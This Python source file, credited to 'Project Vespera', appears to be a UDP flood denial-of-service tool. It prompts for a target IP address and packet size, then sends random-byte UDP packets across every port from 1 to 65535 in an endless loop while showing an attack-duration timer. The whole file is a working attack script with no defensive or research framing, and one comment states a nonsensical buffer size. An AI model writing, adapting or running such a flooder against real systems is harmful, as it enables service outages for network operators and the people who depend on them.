import os
import time
import socket
import random
import threading
from datetime import datetime
from queue import Queue

# Code Time
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 ** 20)  # Set larger buffer size (1000000000000000000000000000000000000000000000000000 GB)
bytes_per_packet = None  # To be initialized later with the user's specified packet size

os.system("cls" if os.name == "nt" else "clear")
print("Author   : Project Vespera")
print("-" * 50)

def get_target():
    while True:
        try:
            ip = input("IP Target : ")
            socket.inet_aton(ip)  # Validate the IP address
            return ip
        except socket.error:
            print("Invalid IP address format. Please try again.")

ip = get_target()

def get_custom_packet_size():
    while True:
        try:
            custom_packet_size = input("Enter the custom packet size in bytes (default 1485): ")
            if not custom_packet_size.strip():
                return 1485  # Default packet size if input is empty
            packet_size = int(custom_packet_size)
            if packet_size <= 0:
                raise ValueError("Packet size must be a positive integer.")
            return packet_size
        except ValueError as e:
            print(f"Invalid input: {e}. Please try again.")

bytes_per_packet = random.randbytes(get_custom_packet_size())

# Function to send packets to a range of ports
def send_packets(ip, start_port, end_port, packet_queue):
    max_buffer_size = 1  # Maximum buffer size (adjust as needed)
    while True:
        try:
            for port in range(start_port, end_port + 1):
                sock.sendto(bytes_per_packet, (ip, port))
                if packet_queue.qsize() < max_buffer_size:
                    packet_queue.put(None)  # Placeholder for sent packet
                else:
                    time.sleep(0.0001)  # Decreased sleep time to send packets faster
        except (socket.error, BlockingIOError) as e:
            print("Error: %s" % e)
            print("Waiting for a moment before resuming...")
            continue

# Start sending packets to a range of ports in a separate thread
packet_queue = Queue()
send_thread = threading.Thread(target=send_packets, args=(ip, 1, 65535, packet_queue))
send_thread.start()

# Timer to display attack duration
start_time = time.time()
try:
    while True:
        time.sleep(0.001)  # Decreased sleep time to update the timer more frequently
        elapsed_time = time.time() - start_time
        m, s = divmod(elapsed_time, 60)
        h, m = divmod(m, 60)
        print(f"Attack duration: {int(h):02d}:{int(m):02d}:{int(s):02d}", end='\r', flush=True)
        packet_queue.get()  # Remove a packet from the queue

except KeyboardInterrupt:
    print("\nStopping the attack...")
    send_thread.join()
    sock.close()